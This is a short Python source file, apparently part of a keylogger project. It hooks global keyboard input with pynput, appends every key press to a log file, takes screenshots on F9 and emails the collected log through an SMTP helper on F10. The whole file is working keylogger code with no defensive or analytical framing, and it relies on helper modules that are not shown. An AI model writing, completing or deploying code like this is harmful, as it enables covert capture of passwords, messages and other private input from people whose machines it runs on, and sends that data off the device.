# Hook into OS-level keyboard input APIs
# Capture key press and key release events
# Handle special keys (Shift, Ctrl, Enter, Backspace, etc.)

from pynput.keyboard import Key, Listener
import storage
import threading
import sys
import datetime
import config 
import screenshot
import smtp
import agent

path = str()

def on_press(key):
    if Key is not None:
        if key == Key.f10: #Press f10 to send a email 
            smtp.send_email()

        if key == Key.f9: #Press f9 to take a screenshot 
            screenshot.log_screenshot()
        else: 
            path = config.open_path()
            with open(path,"a") as file:
                format = storage.log(key, file)
                file.close() 

def run_keylogger():
    print("Keylogger started...")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def on_release(key):
    if key == Key.esc:
        return False


    
        

